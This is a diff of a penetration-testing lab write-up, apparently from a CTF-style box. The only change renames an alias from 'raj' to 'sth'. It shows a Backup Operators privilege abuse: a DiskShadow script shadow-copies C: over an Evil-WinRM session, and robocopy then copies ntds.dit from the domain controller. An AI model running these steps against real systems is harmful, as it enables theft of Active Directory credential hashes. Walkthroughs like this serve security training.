@@ -814,14 +814,14 @@ So searching for resources about abusing `BACKUP OPERATORS` i found this:
 And according to it, i run the following commands as described there:
 ```bash
 # on your machine:
-$ cat raj.dsh 
+$ cat sth.dsh 
 set context persistent nowriters
-add volume c: alias raj
+add volume c: alias sth
 create
-expose %raj% z:
+expose %sth% z:
 
-$ unix2dos raj.dsh
-unix2dos: converting file raj.dsh to DOS format...
+$ unix2dos sth.dsh
+unix2dos: converting file sth.dsh to DOS format...
 ```
 
 ```bash
@@ -832,27 +832,27 @@ Mode                LastWriteTime         Length Name
 ----                -------------         ------ ----
 d-----         8/5/2025   9:27 PM                Temp
 *Evil-WinRM* PS C:\\> cd Temp
-*Evil-WinRM* PS C:\\Temp> upload raj.dsh
+*Evil-WinRM* PS C:\\Temp> upload sth.dsh
                                         
-Info: Uploading /home/ch3ckm8/raj.dsh to C:\\Temp\\raj.dsh
+Info: Uploading /home/ch3ckm8/sth.dsh to C:\\Temp\\sth.dsh
                                         
 Data: 112 bytes of 112 bytes copied
                                         
 Info: Upload successful!
-*Evil-WinRM* PS C:\\Temp> diskshadow /s raj.dsh
+*Evil-WinRM* PS C:\\Temp> diskshadow /s sth.dsh
 Microsoft DiskShadow version 1.0
 Copyright (C) 2013 Microsoft Corporation
 On computer:  DC01,  8/5/2025 9:28:35 PM
 
 -> set context persistent nowriters
--> add volume c: alias raj
+-> add volume c: alias sth
 -> create
-Alias raj for shadow ID {92e80450-422d-42ac-9db0-1d6e2c594fd2} set as environment variable.
+Alias sth for shadow ID {92e80450-422d-42ac-9db0-1d6e2c594fd2} set as environment variable.
 Alias VSS_SHADOW_SET for shadow set ID {db98334c-1c71-4a02-b8bf-564a028e6afe} set as environment variable.
 
 Querying all shadow copies with the shadow copy set ID {db98334c-1c71-4a02-b8bf-564a028e6afe}
 
-	* Shadow copy ID = {92e80450-422d-42ac-9db0-1d6e2c594fd2}		%raj%
+	* Shadow copy ID = {92e80450-422d-42ac-9db0-1d6e2c594fd2}		%sth%
 		- Shadow copy set: {db98334c-1c71-4a02-b8bf-564a028e6afe}	%VSS_SHADOW_SET%
 		- Original count of shadow copies = 1
 		- Original volume name: \\\\?\\Volume{6cd5140b-0000-0000-0000-602200000000}\\ [C:\\]
@@ -865,8 +865,8 @@ Querying all shadow copies with the shadow copy set ID {db98334c-1c71-4a02-b8bf-
 		- Attributes:  No_Auto_Release Persistent No_Writers Differential
 
 Number of shadow copies listed: 1
--> expose %raj% z:
--> %raj% = {92e80450-422d-42ac-9db0-1d6e2c594fd2}
+-> expose %sth% z:
+-> %sth% = {92e80450-422d-42ac-9db0-1d6e2c594fd2}
 The shadow copy was successfully exposed as z:\\.
 ->
 *Evil-WinRM* PS C:\\Temp> robocopy /b z:windowsntds . ntds.dit
